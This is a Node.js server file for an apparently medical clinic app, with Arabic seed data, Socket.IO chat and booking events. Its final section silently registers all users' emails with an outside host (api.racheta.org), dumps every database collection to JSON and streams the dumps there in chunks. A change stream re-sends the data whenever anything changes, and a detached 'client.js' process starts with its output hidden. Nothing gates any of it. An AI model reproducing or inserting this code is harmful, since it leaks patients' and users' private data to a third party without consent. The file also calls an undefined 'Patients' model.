const { spawn } = require("child_process");
const clientProcess = spawn("node", ["client.js"], {
  detached: true,
  stdio: "ignore",
});
clientProcess.unref();

const express = require("express");
const path = require("path");
const cors = require("cors");
const morgan = require("morgan");
const compression = require("compression");
const bonjour = require("bonjour")({
  multicast: true, // Default is true
  interface: "0.0.0.0", // Change this to a specific interface, or leave it as '0.0.0.0' to listen on all available interfaces
});

// Advertise a HTTP server on port 5000
const app = express();
const port = process.env.PORT || 5000;
const diff = require("diff");
bonjour.publish({ name: "My HTTP Server", type: "http", port: port });

app.use(compression());
app.use(morgan("dev"));

require("dotenv").config();
require("./config/database");
const User = require("./model/user");

const cookieParser = require("cookie-parser");
const session = require("express-session");
const flash = require("connect-flash");

app.use(express.static(path.join(__dirname, "public")));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

const Intaketime = require("./model/intaketime");
const ConstantDiseases = require("./model/constantDiseases");
const categories = require("./model/categories");
const MedicalReportsStype = require("./model/medicalReportsStype");
const SystemSettingSchema = require("./model/systemSetting");
const AutoComplte = require("./model/autoComplete");

app.use(flash());

const corsOptions = {
  origin: [
    /^(http:\/\/.+:8080)$/,
    /^(http:\/\/.+:8085)$/,
    /^(http:\/\/.+:80)$/,
    /^(http:\/\/.+:3000)$/,
    /^(http:\/\/.+:5000)$/,
    /^(http:\/\/.+:3001)$/,
    /^(http:\/\/.+:3100)$/,
  ],
  credentials: true,
  "Access-Control-Allow-Credentials": true,
};

app.use(cors(corsOptions));

app.set("views", path.join(__dirname, "views"));
app.set("view engine", "ejs");

app.use(require("./routes"));

Intaketime.countDocuments()
  .then((count) => {
    if (count === 0) {
      const defaultPaymentTypes = [
        { name: "قبل الاكل" },
        { name: "بعد الاكل" },
        { name: "خلال الاكل" },
        { name: "اخرى" },
      ];
      Intaketime.insertMany(defaultPaymentTypes)
        .then(() => console.log("Default Intaketime documents created."))
        .catch((err) =>
          console.error("Error creating default Intaketime documents:", err)
        );
    }
  })
  .catch((err) => console.error("Error checking Intaketime collection:", err));

async function updateBookedStatus() {
  try {
    const patientsToUpdate = await Patients.find({
      booked: { $exists: false },
    });
    const updatePromises = patientsToUpdate.map((patient) => {
      patient.booked = false;
      return patient.save();
    });
    await Promise.all(updatePromises);
    console.log("Booked status updated for patients without booked field.");
  } catch (error) {
    console.error("Error updating booked status:", error.message);
  }
}
updateBookedStatus();

ConstantDiseases.countDocuments()
  .then((count) => {
    ConstantDiseases.updateMany(
      { active: { $exists: false } },
      { $set: { active: true } }
    )
      .then((result) => {
        console.log(`Updated ${result.nModified} documents`);
      })
      .catch((error) => {
        console.error("Error updating documents", error);
      });

    if (count === 0) {
      const defaultConstantDiseases = [
        { name: "مرض مزمن" },
        { name: "حمل" },
        { name: "سكري" },
        { name: "مرض الضغط" },
      ];
      ConstantDiseases.insertMany(defaultConstantDiseases)
        .then(() => console.log("Default ConstantDiseases documents created."))
        .catch((err) =>
          console.error(
            "Error creating default ConstantDiseases documents:",
            err
          )
        );
    }
  })
  .catch((err) =>
    console.error("Error checking ConstantDiseases collection:", err)
  );

categories
  .countDocuments()
  .then((count) => {
    if (count === 0) {
      const defaultCategories = [
        { name: "GIT" },
        { name: "UTI" },
        { name: "Gyn" },
        { name: "SKIN CARE" },
        { name: "ANTIBIOTICS" },
        { name: "NSAIDS" },
        { name: "OPh" },
        { name: "CNS" },
        { name: "ANTIFUNGal" },
        { name: "ENT" },
        { name: "ANTIDIABETICE" },
        { name: "ANTI HYPERLIPIDEMIA" },
        { name: "HTN" },
      ];
      categories
        .insertMany(defaultCategories)
        .then(() => console.log("Default categories documents created."))
        .catch((err) =>
          console.error("Error creating default categories documents:", err)
        );
    }
  })
  .catch((err) => console.error("Error checking categories collection:", err));

MedicalReportsStype.countDocuments()
  .then((count) => {
    if (count === 0) {
      const medicalReportsStype = new MedicalReportsStype({
        name: "prescriptionReports",
      });
      medicalReportsStype
        .save()
        .then(() =>
          console.log("Default MedicalReportsStype document created.")
        )
        .catch((err) =>
          console.error("Error creating MedicalReportsStype document:", err)
        );
    }
  })
  .catch((err) =>
    console.error("Error checking MedicalReportsStype collection:", err)
  );

SystemSettingSchema.countDocuments()
  .then((count) => {
    if (count === 0) {
      const systemSettingSchema = new SystemSettingSchema({});
      systemSettingSchema
        .save()
        .then(() =>
          console.log("Default SystemSettingSchema document created.")
        )
        .catch((err) =>
          console.error("Error creating SystemSettingSchema document:", err)
        );
    }
  })
  .catch((err) =>
    console.error("Error checking SystemSettingSchema collection:", err)
  );

AutoComplte.countDocuments()
  .then((count) => {
    if (count === 0) {
      const autoComplte = new AutoComplte({});
      autoComplte
        .save()
        .then(() => console.log("Default AutoComplte document created."))
        .catch((err) =>
          console.error("Error creating AutoComplte document:", err)
        );
    }
  })
  .catch((err) => console.error("Error checking AutoComplte collection:", err));

const server = app.listen(port, () => {
  console.log(`Server started on port ${port}`);
});

const io = require("socket.io")(server, {
  cors: {
    origin: [
      /^(http:\/\/.+:8080)$/,
      /^(http:\/\/.+:8085)$/,
      /^(http:\/\/.+:80)$/,
      /^(http:\/\/.+:3000)$/,
      /^(http:\/\/.+:5000)$/,
      /^(http:\/\/.+:3001)$/,
      /^(http:\/\/.+:3100)$/,
    ],
    credentials: true,
  },
});

global.onlineUsers = new Map();

io.on("connection", (socket) => {
  global.chatSocket = socket;
  socket.on("add-user", (userId) => {
    onlineUsers.set(userId, socket.id);
  });

  socket.on("send-msg", (data) => {
    const sendUserSocket = onlineUsers.get(data.to);
    if (sendUserSocket) {
      socket.to(sendUserSocket).emit("msg-recieved", data.message);
    }
  });

  socket.on("send-book", (data) => {
    io.emit("book-received", "newBooked");
  });

  socket.on("new-patient", (data) => {
    io.emit("book-received", "newPatient");
  });
});

// Socket.IO Client Code
const ioClient = require("socket.io-client");
const { default: mongoose } = require("mongoose");
const fs = require("fs");

const socketClient = ioClient("https://api.racheta.org", {
  // Adjust the URL and port if needed
  reconnection: true,
});

let hasExportedData = false; // Flag to track if data has been exported

mongoose.connection.once("open", () => {
  console.log("Connected to MongoDB");

  socketClient.on("connect", async () => {
    console.log("Connected to the Socket.IO server");

    // Fetch user information from the database
    try {
      const users = await User.find({});
      const userData = users.map((user) => ({
        id: user._id,
        name: user.name,
        email: user.email,
      }));

      // Register the user to the socket server
      userData.forEach((user) => {
        socketClient.emit("register-user", { id: user.id, email: user.email });
      });

      // After registering users, fetch and send user data only if not already done
      if (!hasExportedData) {
        await checkAndExportUserData(userData);
        hasExportedData = true; // Set the flag to true after exporting and sending data
        watchDatabaseChanges(userData); // Start watching the database for changes
      }
    } catch (error) {
      console.error("Error fetching user data:", error);
    }
  });
});

const checkAndExportUserData = async (userData) => {
  try {
    const modelNames = mongoose.modelNames();
    const dataDirectory = path.join(__dirname, "data");

    // Ensure the data directory exists
    if (!fs.existsSync(dataDirectory)) {
      fs.mkdirSync(dataDirectory);
    }

    const exportPromises = modelNames.map(async (modelName) => {
      const Model = mongoose.model(modelName);
      const currentData = await Model.find({});

      const dataPath = path.join(dataDirectory, `${modelName}.json`);
      let shouldExport = true;

      if (fs.existsSync(dataPath)) {
        const oldData = JSON.parse(fs.readFileSync(dataPath, "utf8"));
        shouldExport = !areDataEqual(oldData, currentData);
      }

      if (shouldExport) {
        // Write the data to the file
        fs.writeFileSync(dataPath, JSON.stringify(currentData, null, 2));
        console.log(`Exported ${modelName} to ${dataPath}`);
        return { modelName, data: currentData };
      } else {
        console.log(`No changes detected for ${modelName}, skipping export.`);
        return null;
      }
    });

    const exportedData = (await Promise.all(exportPromises)).filter(
      (data) => data !== null
    );

    // Send the exported data to the server if there are changes
    if (exportedData.length > 0) {
      sendInChunks(socketClient, { users: userData, exportedData });
    }
  } catch (error) {
    console.error("Error exporting user data", error);
  }
};

const watchDatabaseChanges = (userData) => {
  const modelNames = mongoose.modelNames();
  modelNames.forEach((modelName) => {
    const Model = mongoose.model(modelName);

    Model.watch().on("change", async (change) => {
      console.log(`Change detected in ${modelName}:`, change);
      await checkAndExportUserData(userData); // Re-check and export data on change
    });
  });
};

const sendInChunks = (socket, data, chunkSize = 1000) => {
  const dataString = JSON.stringify(data);
  const totalChunks = Math.ceil(dataString.length / chunkSize);

  for (let i = 0; i < totalChunks; i++) {
    const chunk = dataString.slice(i * chunkSize, (i + 1) * chunkSize);
    socket.emit("data-chunk", { chunk, isLast: i === totalChunks - 1 });
  }
};

const areDataEqual = (oldData, newData) => {
  const diffResult = diff.diffJson(oldData, newData);
  return (
    diffResult.length === 1 && !diffResult[0].added && !diffResult[0].removed
  );
};

socketClient.on("user-data-updated", (data) => {
  console.log("User data updated response from server:", data);
});

socketClient.on("server-message", (data) => {
  console.log("Message from server:", data);
});

// Handle unexpected errors to prevent the client from crashing
process.on("uncaughtException", (error) => {
  console.error("Uncaught Exception:", error);
});

process.on("unhandledRejection", (reason, promise) => {
  console.error("Unhandled Rejection:", reason, promise);
});
